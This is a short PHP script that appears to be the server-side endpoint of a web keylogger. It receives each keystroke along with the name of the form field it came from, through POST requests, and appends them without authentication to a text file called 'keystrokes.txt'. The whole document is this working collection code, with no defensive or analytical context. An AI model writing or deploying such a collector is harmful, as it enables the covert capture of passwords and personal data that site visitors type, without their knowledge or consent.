<?php
if (isset($_POST['fieldName']) && isset($_POST['keystroke'])) {
    $fieldName = $_POST['fieldName'];
    $keystroke = $_POST['keystroke'];

    // Save keystrokes in a log file
    $logData = "Field: $fieldName, Keystroke: $keystroke\n";
    file_put_contents("keystrokes.txt", $logData, FILE_APPEND);
}
?>

